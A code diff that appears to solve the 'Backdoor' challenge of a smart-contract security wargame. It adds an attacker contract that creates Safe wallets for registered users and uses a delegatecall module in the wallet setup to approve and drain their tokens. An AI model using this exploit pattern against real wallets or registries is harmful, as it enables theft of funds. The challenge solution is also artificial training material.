@@ -5,8 +5,71 @@ pragma solidity =0.8.25;
 import {Test, console} from "forge-std/Test.sol";
 import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
 import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
+import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
+
+// Malicious module to be executed via delegatecall during Safe setup
+contract ApprovalModule {
+    function approve(address token, address spender, uint256 amount) external {
+        DamnValuableToken(token).approve(spender, amount);
+    }
+}
+
+contract BackdoorAttacker {
+    address private immutable singletonCopy;
+    SafeProxyFactory private immutable walletFactory;
+    WalletRegistry private immutable walletRegistry;
+    DamnValuableToken private immutable token;
+    ApprovalModule private immutable approvalModule;
+
+    constructor(
+        address _singletonCopy,
+        address _walletFactory,
+        address _walletRegistry,
+        address _token
+    ) {
+        singletonCopy = _singletonCopy;
+        walletFactory = SafeProxyFactory(_walletFactory);
+        walletRegistry = WalletRegistry(_walletRegistry);
+        token = DamnValuableToken(_token);
+        approvalModule = new ApprovalModule();
+    }
+
+    function attack(address[] calldata users, address recovery) external {
+        for (uint256 i = 0; i < users.length; i++) {
+            address user = users[i];
+
+            // Prepare the Safe setup data
+            address[] memory owners = new address[](1);
+            owners[0] = user;
+
+            // Create initializer that will delegatecall to our approval module
+            bytes memory initializer = abi.encodeWithSelector(
+                Safe.setup.selector,
+                owners, // _owners
+                1, // _threshold
+                address(approvalModule), // to (for delegatecall)
+                abi.encodeWithSelector(ApprovalModule.approve.selector, address(token), address(this), 10e18), // data
+                address(0), // fallbackHandler
+                address(0), // paymentToken
+                0, // payment
+                payable(address(0)) // paymentReceiver
+            );
+
+            // Create the Safe proxy with callback
+            SafeProxy proxy = walletFactory.createProxyWithCallback(
+                singletonCopy,
+                initializer,
+                0, // saltNonce
+                walletRegistry
+            );
+
+            // Transfer tokens from the newly created wallet to recovery
+            token.transferFrom(address(proxy), recovery, 10e18);
+        }
+    }
+}
 
 contract BackdoorChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -70,7 +133,13 @@ contract BackdoorChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_backdoor() public checkSolvedByPlayer {
-        
+        BackdoorAttacker attacker = new BackdoorAttacker(
+            address(singletonCopy),
+            address(walletFactory),
+            address(walletRegistry),
+            address(token)
+        );
+        attacker.attack(users, recovery);
     }
 
     /**
